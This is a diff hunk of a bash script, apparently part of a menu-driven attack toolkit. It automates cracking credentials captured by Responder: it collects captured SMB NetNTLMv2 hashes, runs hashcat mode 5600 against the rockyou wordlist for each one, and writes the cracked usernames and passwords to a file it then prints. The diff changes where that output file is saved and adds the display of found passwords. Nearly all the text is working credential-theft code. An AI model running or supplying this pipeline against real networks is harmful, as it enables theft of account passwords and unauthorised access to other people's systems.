@@ -16,6 +16,9 @@ mkdir Responder/$datetime/logbackup
 mv /usr/share/responder/logs/SMB* Responder/$datetime/logbackup/
 for hash in $(cat Responder/$datetime/logbackup/SMB* | sort -u) ; do ((counter++)) ; echo "$hash" >> Responder/$datetime/$counter.txt ; done
 for eachhash in $( ls Responder/$datetime/*.txt | tr " " "\n") ; do ((counter2++)) ; hashcat --force -m 5600 -o Responder/$datetime/hashcat$counter2 --outfile-format 3 $eachhash /usr/share/wordlists/rockyou.txt ; done
-for crackedpass in $(ls Responder/$datetime/hashcat* | tr " " "\n") ; do  { awk -F: '{print $1}' $crackedpass; echo ":" ; awk -F: '{print $7}' $crackedpass; echo " "; } | tr -d "\n" | tr " " "\n" >> userpass.txt ; done
-
+for crackedpass in $(ls Responder/$datetime/hashcat* | tr " " "\n") ; do  { awk -F: '{print $1}' $crackedpass; echo ":" ; awk -F: '{print $7}' $crackedpass; echo " "; } | tr -d "\n" | tr " " "\n" >> Responder/$datetime/userpass.txt ; done
+clear
+echo "Passwords found: "
+cat Responder/$datetime/userpass.txt
+echo "file is located in Responder/$datetime/userpass.txt"
 read -p "Press Enter to return to the main menu"
